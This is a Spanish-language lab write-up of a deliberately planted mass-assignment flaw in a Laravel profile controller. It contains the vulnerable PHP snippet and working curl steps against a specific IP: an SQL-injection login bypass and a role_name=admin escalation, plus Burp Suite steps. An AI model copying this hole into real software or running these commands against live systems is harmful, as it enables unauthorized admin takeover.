# 03 - Mass Assignment / Escalación de Roles

**Responsable:** Bri
**Tipo:** Mass Assignment (A01:2021 - Broken Access Control)

## Archivo modificado
`app/Http/Controllers/ProfileController.php` (línea 33-35)

## Cambio realizado
Se agregó lógica que permite asignar cualquier rol de Spatie Permission desde el request de actualización de perfil:

```php
// 🔥 VULNERABLE - Agregado en update():
if ($request->has('role_name')) {
    $user->syncRoles([$request->role_name]);
}
```

Esto permite que cualquier usuario autenticado se asigne a sí mismo el rol `admin`, `gerente`, etc.

## Explotación

### Paso 1: Login como admin (SQLi)
```bash
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null
```

### Paso 2: Obtener token y email del perfil
```bash
PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')
```

### Paso 3: Escalar a admin (Mass Assignment)
```bash
curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&role_name=admin"
```

### Paso 4: Verificar acceso admin
```bash
curl -b cookies.txt "http://37.60.230.11/admin/usuarios" | grep -oP '(Guardar|Crear usuario)'
```

## Resultado (verificado)
```
PROFILE PATCH:  HTTP 302 (redirect a /profile)
ADMIN PANEL:    HTTP 200 (panel de usuarios accesible)
```

## Con Burp Suite
1. Abrir Burp: `burpsuite`
2. Proxy → Intercept ON
3. Navegar a `http://37.60.230.11/profile`
4. Interceptar el PATCH /profile
5. Agregar `&role_name=admin` al body
6. Forward
7. Navegar a `http://37.60.230.11/admin/usuarios` → admin

## Impacto
- Escalación de privilegios de **usuario normal → admin**
- Acceso a rutas protegidas (`/admin/*`)
- Gestión de usuarios, ventas, productos del hotel
- Potencial compromiso total del sistema
